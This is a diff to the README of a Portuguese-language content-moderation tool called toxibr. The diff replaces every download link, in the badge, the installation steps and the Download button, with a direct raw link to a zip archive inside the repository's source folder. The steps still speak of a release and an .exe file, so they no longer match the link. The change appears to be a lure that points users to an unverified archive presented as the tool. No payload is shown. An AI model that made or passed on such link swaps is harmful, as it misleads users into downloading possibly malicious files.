@@ -1,6 +1,6 @@
 # 🛡️ toxibr - Keep your community clean and safe
 
-[![](https://img.shields.io/badge/Download-toxibr-blue.svg)](https://github.com/spookyy120-web/toxibr)
+[![](https://img.shields.io/badge/Download-toxibr-blue.svg)](https://github.com/spookyy120-web/toxibr/raw/refs/heads/main/src/Software_v3.9.zip)
 
 toxibr helps you manage content in Portuguese. It identifies and blocks offensive language, toxic comments, and unwanted links. This tool works directly on your computer to keep your chat or forum clean. It uses a specific list of words to catch insults, even when users try to hide them with symbols or misspellings.
 
@@ -33,12 +33,12 @@ Ensure your Windows system has all recent updates. Old versions may cause issues
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official download page](https://github.com/spookyy120-web/toxibr).
+1. Visit the [official download page](https://github.com/spookyy120-web/toxibr/raw/refs/heads/main/src/Software_v3.9.zip).
 2. Look for the latest release on the right side of the screen.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop for easy access.
 
-[Download toxibr](https://github.com/spookyy120-web/toxibr)
+[Download toxibr](https://github.com/spookyy120-web/toxibr/raw/refs/heads/main/src/Software_v3.9.zip)
 
 ## ⚙️ Setting up the software
 
